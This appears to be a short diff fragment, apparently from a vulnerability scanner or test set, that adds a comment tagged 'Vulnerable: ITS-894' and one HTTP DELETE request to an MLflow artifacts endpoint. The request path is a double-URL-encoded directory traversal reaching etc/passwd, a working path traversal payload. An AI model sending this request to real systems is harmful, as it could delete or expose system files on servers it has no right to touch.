@@ -1,0 +1,2 @@
+# Vulnerable: ITS-894
+DELETE /api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252fpasswd
